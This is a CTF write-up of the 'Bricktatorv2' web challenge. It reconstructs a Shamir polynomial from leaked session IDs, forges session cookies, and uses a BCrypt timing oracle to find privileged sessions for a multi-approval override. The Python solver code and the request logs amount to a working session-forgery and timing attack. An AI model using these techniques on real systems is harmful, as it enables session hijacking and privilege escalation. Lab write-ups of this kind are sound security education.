# Bricktatorv2 — Writeup

## Challenge

**Target:** `http://bricktatorv2.web.ctf.umasscybersec.org:8080/`
**Flag format:** `UMASS{...}`
**Hint:** *"If you're brute forcing more than a few minutes, you're doing it wrong."*

Whitebox challenge. Source code and a dossier file were provided. The application is a Spring Boot "Nuclear Control Center" with ~5000 seeded in-memory sessions, a Shamir secret sharing scheme embedded in session IDs, and a multi-approval reactor override endpoint.

Credentials from the dossier: `bricktator / goldeagle`.

---

## Recon

### Session structure

Session IDs are encoded polynomial shares, formatted as `%05d-%08x` — the x-coordinate and y-coordinate of a point on a degree-2 polynomial over a prime field.

```
// SecretSharing.java
// f(x) = a + b*x + c*x² mod PRIME (PRIME = 2^31 - 1 = 2147483647)
String sessionId = "%05d-%08x".formatted(share.x(), share.y());
```

Known anchor points from `SessionSuccessHandler.java`:

| User | x | Session ID |
|---|---|---|
| John_Doe | 1 | obtained via `/actuator/sessions?username=john_doe` |
| Jane_Doe | 5 | obtained via `/actuator/sessions?username=jane_doe` |
| bricktator | 5001 | obtained after login |

The Spring Boot actuator exposed `/actuator/sessions` (requires Q_CLEARANCE or YANKEE_WHITE role), which returned exact session IDs for these three users.

### Override mechanism

`OverrideService.java` requires **5 unique YANKEE_WHITE sessions** to approve a token. Bricktator initiates the override (counts as approval #1). Four more YANKEE_WHITE sessions are needed.

`SessionSeeder.java` seeds 5000 sessions at startup. Seven of them are randomly assigned `role=YANKEE_WHITE`; the rest get `role=Q_CLEARANCE`. Bricktator's session is always YANKEE_WHITE. The seven random YANKEE_WHITE sessions have generated usernames (`Word_UUID`) that can't be enumerated.

### Timing oracle

`CommandWorkFilter.java` (filter order `-150`, runs before Spring Security) contains:

```java
if (request.getRequestURI().startsWith("/command")) {
    String rawId = resolveSessionId(request);
    if (rawId != null) {
        var session = sessionRepo.findById(rawId);
        if (session != null && "YANKEE_WHITE".equals(session.getAttribute("role"))) {
            accessLog.record(bcrypt.encode(rawId + PEPPER));  // BCrypt strength 13 — blocks thread
        }
    }
}
chain.doFilter(request, response);
```

BCrypt at strength 13 runs **synchronously** on the Tomcat thread before the response is sent, even for unauthenticated sessions. This creates a measurable timing difference:

- Q_CLEARANCE session → redirect → **~0.22 s**
- YANKEE_WHITE session → BCrypt (~0.92 s) + redirect → **~1.14 s**

---

## Vulnerability

Two primitives combine to solve the challenge:

**1. Polynomial reconstruction from public endpoints.**
With three known (x, y) pairs (from the actuator), the polynomial `f(x) = a + bx + cx²  mod 2^31-1` can be fully recovered via Gaussian elimination mod p. This lets us compute every valid session ID for `x = 1..5001` without brute force.

**2. BCrypt timing oracle on `/command`.**
The filter leaks YANKEE_WHITE membership via response latency. With all session IDs precomputed, scanning the full space of 4998 candidate sessions takes ~68 seconds at concurrency 20, and YANKEE_WHITE sessions appear as clear outliers (~0.92 s vs ~0.22 s).

The override endpoint (`/override/{token}`) is `permitAll()` — no authentication is required to submit an approval. The `isYankeeWhite` check only fires when the **5th** approval is submitted, querying `sessionRepo.findById(sessionId)` to verify role. A valid YANKEE_WHITE session cookie is sufficient.

---

## Exploitation

### Step 1 — Reconstruct the polynomial

Log in as `bricktator / goldeagle` to get the seeded session cookie (`05001-xxxxxxxx`). Query the actuator for john_doe and jane_doe session IDs:

```
GET /actuator/sessions?username=john_doe   → 00001-6aaa2fea  (x=1, y=0x6aaa2fea)
GET /actuator/sessions?username=jane_doe   → 00005-2e5accd7  (x=5, y=0x2e5accd7)
bricktator login cookie                    → 05001-12080e9c  (x=5001, y=0x12080e9c)
```

Gaussian elimination mod `PRIME = 2147483647`:

```python
PRIME = 2147483647

def modinv(a, m):
    return pow(a, m-2, m)

points = [(1, 0x6aaa2fea), (5, 0x2e5accd7), (5001, 0x12080e9c)]

x0,y0=points[0]; x1,y1=points[1]; x2,y2=points[2]
r2_b=(x1-x0)%PRIME; r2_c=(x1**2-x0**2)%PRIME; r2_rhs=(y1-y0)%PRIME
r3_b=(x2-x0)%PRIME; r3_c=(x2**2-x0**2)%PRIME; r3_rhs=(y2-y0)%PRIME
r3_c_new=(r3_c*r2_b - r2_c*r3_b)%PRIME
r3_rhs_new=(r3_rhs*r2_b - r2_rhs*r3_b)%PRIME
c = (r3_rhs_new * modinv(r3_c_new, PRIME)) % PRIME
b = ((r2_rhs - r2_c*c) * modinv(r2_b, PRIME)) % PRIME
a = (y0 - b*x0 - c*x0**2) % PRIME
# → a=125887934, b=221611101, c=1442039247
```

Verified: `f(1)=0x6aaa2fea`, `f(5)=0x2e5accd7`, `f(5001)=0x12080e9c`.

### Step 2 — Compute all session cookies

```python
def sid(x): return f"{x:05d}-{f(x):08x}"
def ck(x):  return base64.b64encode(sid(x).encode()).decode().rstrip("=")
```

### Step 3 — Scan with timing oracle

Using `aiohttp` with `DummyCookieJar` (to prevent cookie jar contamination) and raw `Cookie` headers:

```python
async def probe(sess, x):
    headers = {"Cookie": f"SESSION={ck(x)}"}
    start = time.perf_counter()
    async with sess.get(f"{BASE}/command", headers=headers,
                        allow_redirects=False, timeout=aiohttp.ClientTimeout(total=3)) as r:
        await r.read()
    return x, time.perf_counter() - start
```

Scan all x in `[2, 5000] \ {5}` at concurrency 20, threshold 0.60 s. Completed in **68 seconds**.

Results — clear bimodal distribution:

| x | Time | Session ID |
|---|---|---|
| 2588 | 0.932 s | `02588-50ea3d70` |
| 1382 | 0.926 s | `01382-16ebdacc` |
| 3928 | 0.925 s | `03928-063b57a1` |
| 913  | 0.924 s | `00913-33b3c7f7` |
| 614  | 0.924 s | `00614-77713288` |
| 4378 | 0.923 s | `04378-7af30c55` |
| 490  | 0.919 s | `00490-1c11891a` |

Exactly 7 sessions above ~0.90 s — matching the expected YANKEE_WHITE count from the seeder. Thirteen false positives at 0.64–0.69 s were discarded (server CPU contention from neighbouring BCrypt operations in the same batch).

### Step 4 — Execute the override

```python
# Initiate override as bricktator (approval #1)
POST /command/override  Cookie: SESSION=MDUwMDEtMTIwODBlOWM=
→ token: 63a4336990303a719240bac4774bbc81

# Submit approvals #2–5 with YANKEE_WHITE sessions
POST /override/63a4336990303a719240bac4774bbc81  Cookie: SESSION=MDI1ODgtNTBlYTNkNzA  → APPROVED (2/5)
POST /override/63a4336990303a719240bac4774bbc81  Cookie: SESSION=MDEzODItMTZlYmRhY2M  → APPROVED (3/5)
POST /override/63a4336990303a719240bac4774bbc81  Cookie: SESSION=MDM5MjgtMDYzYjU3YTE  → APPROVED (4/5)
POST /override/63a4336990303a719240bac4774bbc81  Cookie: SESSION=MDA5MTMtMzNiM2M3Zjc  → COMPLETE → FLAG
```

On the 5th approval, `OverrideService.approve()` runs `allMatch(isAuthorized)` across all five session IDs. All five resolve to `role=YANKEE_WHITE` in the repository → `ApprovalResult.COMPLETE` → flag rendered in response.

---

## Flag

`UMASS{stUx_n3T_a1nt_g0T_n0th1nG_0N_th15_v2!!!randomNoiseAndStuff}`

---

## Timeline

- Server restarts every ~30 minutes (all in-memory sessions wiped, new polynomial generated). The polynomial must be reconstructed fresh after each restart. Two scans failed on stale polynomial data before the timing was right.
- Timing calibration was critical: sequential `urllib` showed 1.2 s vs 0.87 s (misleading), while async `aiohttp` with connection reuse showed 1.14 s vs 0.22 s (clean 5× gap).
- The `DummyCookieJar` fix was necessary — aiohttp's default cookie jar accumulated `Set-Cookie` responses from warmup requests and overwrote the manually set `SESSION` cookie on subsequent requests.

---
Solved with foqsec, by lilsadfoqs.
